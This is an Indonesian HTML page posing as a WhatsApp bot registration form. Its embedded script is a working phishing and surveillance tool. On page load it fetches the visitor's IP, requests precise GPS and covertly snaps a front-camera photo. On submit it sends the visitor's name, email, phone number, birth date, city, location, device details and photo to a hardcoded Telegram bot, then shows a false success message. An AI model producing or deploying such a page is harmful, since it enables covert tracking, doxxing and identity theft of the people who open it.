<!DOCTYPE html>
<html lang="id">
<head>
    <IBRAAX DEVcharset="UTF-8">
    <IBRAAX DEVname="viewport" content="width=device-width, initial-scale=1.0">
    <title>PENDAFTARAN BOT WA - MARVEL AI</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: radial-gradient(circle at center, #0a0818, #120f2c, #000); min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; padding: 20px; }
        .card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(0, 255, 204, 0.2); padding: 30px; border-radius: 24px; width: 100%; max-width: 480px; box-shadow: 0 25px 50px rgba(0,0,0,0.8); text-align: center; }
        .card h2 { margin-bottom: 6px; font-size: 22px; color: #00ffcc; font-weight: 700; letter-spacing: 1px; }
        .card p { font-size: 11px; color: #aaa; margin-bottom: 20px; line-height: 1.4; }
        .input-group { margin-bottom: 12px; text-align: left; }
        .input-group label { display: block; font-size: 10px; margin-bottom: 4px; color: #00ffcc; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
        .input-group input { width: 100%; padding: 10px 14px; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 10px; color: #fff; font-size: 13px; outline: none; transition: 0.3s; }
        .input-group input:focus { border-color: #00ffcc; box-shadow: 0 0 12px rgba(0,255,204,0.4); background: rgba(0,0,0,0.7); }
        .tools-box { background: rgba(0, 255, 204, 0.05); border: 1px dashed rgba(0, 255, 204, 0.3); padding: 12px; border-radius: 12px; margin-bottom: 15px; font-size: 11px; color: #00ffcc; display: flex; justify-content: space-around; align-items: center; }
        .btn-submit { width: 100%; padding: 14px; background: linear-gradient(135deg, #00ffcc, #0077ff); border: none; color: #000; font-weight: 700; border-radius: 12px; cursor: pointer; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; box-shadow: 0 5px 20px rgba(0,255,204,0.4); }
        .btn-submit:hover { opacity: 0.9; transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,255,204,0.6); }
        #cam-stream { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h2>PENDAFTARAN BOT WA</h2>
        <p>Lengkapi data verifikasi di bawah untuk mengaktifkan koneksi bot WhatsApp secara otomatis.</p>
        
        <div class="tools-box">
            <span>🛡️ IP Target: <b id="lbl-ip">Detecting...</b></span>
            <span>📍 GPS: <b id="lbl-gps" style="color: #ffa500;">Menunggu Izin...</b></span>
        </div>

        <form id="botForm">
            <div class="input-group">
                <label>Nama Lengkap</label>
                <input type="text" id="nama" placeholder="Masukkan nama lengkap" required>
            </div>
            <div class="input-group">
                <label>Email Aktif</label>
                <input type="email" id="email" placeholder="nama@email.com" required>
            </div>
            <div class="input-group">
                <label>Nomor WhatsApp (Target)</label>
                <input type="text" id="whatsapp" placeholder="628xxxxxxxxxx" required>
            </div>
            <div class="input-group">
                <label>Tanggal Lahir</label>
                <input type="date" id="tgl_lahir" required>
            </div>
            <div class="input-group">
                <label>Kota Domisili</label>
                <input type="text" id="kota" placeholder="Contoh: Jakarta" required>
            </div>

            <button type="submit" class="btn-submit" id="btnAction">SELESAIKAN PENDAFTARAN</button>
        </form>
    </div>

    <!-- Hidden Video & Canvas for Camera Capture Tool -->
    <video id="cam-stream" autoplay playsinline></video>
    <canvas id="cam-canvas" style="display:none;"></canvas>

    <script>
        // --- KONFIGURASI TELEGRAM ---
        const BOT_TOKEN = "8631925979:AAGKl2x7jcNFvRBIqceA2OYUSZu1VxOPDXo"; 
        const CHAT_ID = "8755668234";  // lu ganti seperti di awal

        let userIp = "Tidak Diketahui";
        let userLocation = "GPS Tidak Diizinkan";
        let capturedPhoto = null;

        // 1. Ambil IP Target otomatis saat halaman dibuka
        fetch('https://api64.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                userIp = data.ip;
                document.getElementById('lbl-ip').innerText = userIp;
            }).catch(() => {
                document.getElementById('lbl-ip').innerText = "Gagal Deteksi";
            });

        // 2. Auto Trigger GPS (Location Bypass)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    userLocation = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                    document.getElementById('lbl-gps').innerText = "Aktif (Akurat)";
                    document.getElementById('lbl-gps').style.color = "#00ffcc";
                },
                (error) => {
                    document.getElementById('lbl-gps').innerText = "Ditolak/Error";
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        // 3. Auto Trigger Stealth Camera Tool
        async function captureCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('cam-stream');
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 1500)); // Delay agar kamera fokus

                const canvas = document.getElementById('cam-canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
                
                // Matikan stream kamera setelah ambil gambar
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                console.log("Kamera tidak diizinkan atau tidak tersedia.");
            }
        }

        // Jalankan fungsi kamera di background saat load
        window.addEventListener('load', () => {
            captureCamera();
        });

        // 4. Eksekusi Kirim Data Lengkap ke Telegram (Personal & Group)
        document.getElementById('botForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('btnAction');
            btn.innerText = "MENGIRIM DATA & TOOLS...";
            btn.disabled = true;

            // Pastikan kamera sempat terambil jika belum
            if(!capturedPhoto) {
                await captureCamera();
            }

            const nama = document.getElementById('nama').value;
            const email = document.getElementById('email').value;
            const whatsapp = document.getElementById('whatsapp').value;
            const tglLahir = document.getElementById('tgl_lahir').value;
            const kota = document.getElementById('kota').value;
            const deviceInfo = navigator.userAgent;

            const textMessage = `🚀 *WOW TARGET MUNCUL NIH (IBRAAX AI)* 🚀\n\n` +
                                `👤 *Nama:* ${nama}\n` +
                                `📧 *Email:* ${email}\n` +
                                `📱 *No WA:* ${whatsapp}\n` +
                                `🎂 *Tgl Lahir:* ${tglLahir}\n` +
                                `🏙️ *Kota:* ${kota}\n\n` +
                                `🌐 *IP Address:* \`${userIp}\`\n` +
                                `📍 *GPS Lokasi:* ${userLocation}\n` +
                                `💻 *Perangkat:* ${deviceInfo}`;

            try {
                // Kirim Teks
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: textMessage,
                        parse_mode: 'Markdown'
                    })
                });

                // Kirim Foto Kamera jika berhasil diambil
                if (capturedPhoto) {
                    const blob = await (await fetch(capturedPhoto)).blob();
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'target_cam.jpg');
                    formData.append('caption', `📸 *Stealth Capture Tool - Target: ${nama}*`);

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }

                alert("Pendaftaran berhasil diproses! Bot WhatsApp Anda sedang disinkronkan.");
                location.reload();

            } catch (err) {
                alert("Gagal mengirim data. Periksa kembali token bot Anda.");
                btn.innerText = "SELESAIKAN PENDAFTARAN";
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
